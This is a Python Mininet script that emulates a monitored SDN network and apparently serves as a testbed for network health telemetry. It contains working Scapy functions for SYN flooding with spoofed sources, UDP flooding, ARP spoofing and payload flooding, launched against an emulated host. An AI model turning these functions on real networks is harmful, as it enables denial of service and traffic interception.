from mininet.topo import Topo
from mininet.net import Mininet
from mininet.node import CPULimitedHost, Host
from mininet.link import TCLink
from mininet.log import setLogLevel, info
# Add remote controller
from mininet.node import RemoteController
import time
import datetime
from scapy.all import Ether, IP, TCP, UDP, ARP, Raw, send, sendp
import socket
from health_switch import HealthMonitoringSwitch
from hlp_switch import EnhancedSwitch
from packet_processor import end2end_cc2dc
from hlp_switch import *

import random
import threading
from threading import Event

class CustomTopo(Topo):
    def build(self, n=3):
        s1 = self.addSwitch('s1', cls=HealthMonitoringSwitch)
        s1h = self.addHost('s1h')
        dcs = self.addSwitch('dcs1')
        h1 = self.addHost('h1')
        cc = self.addHost('cc')
        h2 = self.addHost('h2')
        dc = self.addHost('dc')
        h3 = self.addHost('h3')
        self.addLink(s1h, s1)
        self.addLink(h1, s1)
        self.addLink(cc, s1)
        self.addLink(h2, s1)
        self.addLink(h3, s1)
        self.addLink(dc, dcs)
        self.addLink(cc, dcs)
        self.addLink(s1, dcs)

def syn_flood_attack(target_ip, target_port, stop_event, source_ip=None):
    """
    Perform a SYN flood attack on the target IP and port.
    :param target_ip: The IP address of the target.
    :param target_port: The port to target on the victim.
    :param stop_event: A threading event to stop the attack.
    :param source_ip: Optional spoofed source IP address.
    """
    print(f"Starting custom SYN flood attack on {target_ip}:{target_port}...")
    while not stop_event.is_set():
        try:
            # Generate a random source IP if not provided
            src_ip = source_ip if source_ip else f"192.168.1.{random.randint(2, 254)}"
            # Create the IP and TCP layers
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            # Send the packet
            send(ip_layer/tcp_layer, verbose=False)
        except Exception as e:
            print(f"Error during SYN flood attack: {e}")
            break
    print("SYN flood attack stopped.")

def udp_flood_attack(target_ip, target_port, stop_event):
    print(f"Starting UDP flood attack on {target_ip}:{target_port}...")
    while not stop_event.is_set():
        try:
            packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X" * 1024)
            send(packet, verbose=False)
        except Exception as e:
            print(f"Error during UDP flood attack: {e}")
            break
    print("UDP flood attack stopped.")

def arp_spoof(target_ip, gateway_ip, stop_event):
    print(f"Starting ARP spoofing attack on {target_ip}...")
    while not stop_event.is_set():
        try:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip), verbose=False)
        except Exception as e:
            print(f"Error during ARP spoofing: {e}")
            break
    print("ARP spoofing attack stopped.")

def custom_payload_attack(target_ip, target_port, payload, stop_event):
    print(f"Starting custom payload attack on {target_ip}:{target_port}...")
    while not stop_event.is_set():
        try:
            packet = IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=payload)
            send(packet, verbose=False)
        except Exception as e:
            print(f"Error during custom payload attack: {e}")
            break
    print("Custom payload attack stopped.")

def simpleTest():
    topo = CustomTopo(n=3)
    net = Mininet(topo=topo, link=TCLink, controller=None)
    net.addController('pox', controller=RemoteController, ip='127.0.0.1', port=6633)
    net.start()
    
    s1 = net.get('s1')
    s1.capture_initial_stats()
    s1h = net.get('s1h')
    h1 = net.get('h1')
    cc = net.get('cc')
    h2 = net.get('h2')
    h3 = net.get('h3')
    dc = net.get('dc')

    net.pingAll()

    # Print IP Addressses
    print("IP Addresses:")
    print("h1: ", h1.IP())
    print("h2: ", h2.IP())
    print("h3: ", h3.IP())
    print("cc: ", cc.IP())
    print("dc: ", dc.IP())
    print("s1: ", s1.IP())
    print("s1h: ", s1h.IP())
        

    h2.cmd('iperf -s -u -i 1 > iperf_server_output &')
    time.sleep(1)
    h1.cmd('iperf -c ' + h2.IP() + ' -u -b 10m &')
    time.sleep(1)
    h3.cmd('iperf -c ' + h2.IP() + ' -u -b 10m &')
    time.sleep(1)
    enhanced_switch = EnhancedSwitch(s1h, s1, parameters={})
    dc.cmd('tcpdump -i any udp port 12345 -w capture.pcap &')
    cc.cmd('tcpdump -i any -v -w cc1.pcap not icmp6 and not port 5353 and not arp &')

    ticks = 0    
    stop_event = Event()  # Create a stop event for the attack thread
    attack_thread = None  # Initialize the attack thread
    while True:
        time.sleep(1)
        try:
            ticks += 1
            ticks %= 10

            if ticks == 3:
                # Start custom SYN flood attack from h3 to h2
                info("Starting custom SYN flood attack from h3 to h2...\n")
                stop_event.clear()  # Clear the stop event
                attack_threads = [] 
                for i in range(2):
                    attack_thread = threading.Thread(target=udp_flood_attack, args=("192.168.1.2", 12345, stop_event))
                    attack_thread.daemon = True
                    attack_thread.start()
                    attack_threads.append(attack_thread)

            if ticks == 8:
                # Stop SYN flood attack
                info("Stopping custom SYN flood attack...\n")
                stop_event.set()  # Signal the attack thread to stop
                for thread in attack_threads:
                    thread.join()  # Wait for the thread to finish

            if ticks%2 == 0:
                # End tcpdump of cc
                cc.cmd('kill %tcpdump')
                # Read the file cc1.pcap and send a "Hello" message to the dc from cc
                cc.cmd('python3 packet_processor.py cc1.pcap cc1')
                # Send the data to the dc
                cc.cmd('cat cc1_payload.txt | nc -u -w 1 {} 12345'.format(dc.IP())) # send data as UDP
                print(f"cc1: Sent UDP packet at {time.time()}")
                # Delete the file
                cc.cmd('rm cc1.pcap')
                # Restart tcpdump
                cc.cmd('tcpdump -i any -v -w cc1.pcap not icmp6 and not port 5353 and not arp &')
            
            if ticks == 9:
                # End tcpdump of dc
                dc.cmd('kill %tcpdump')
                # Read the file capture.pcap and send a "Hello" message to the cc from dc
                dc.cmd('python3 dc_packet_saver.py capture.pcap')
                # print PROCESSING
                print("PROCESSING at dc")
                # delete the file
                dc.cmd('rm capture.pcap')
                # Begin the tcpdump of dc
                dc.cmd('tcpdump -i any udp port 12345 -w capture.pcap &')

            enhanced_switch.send_health_parameters(cc)

        except KeyboardInterrupt:
            print("Stopping telemetry...")
            break

    cc.cmd('killall tcpdump')
    cc.cmd('python3 packet_processor.py cc1.pcap cc1')

    h2.cmd('killall iperf')

    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    simpleTest()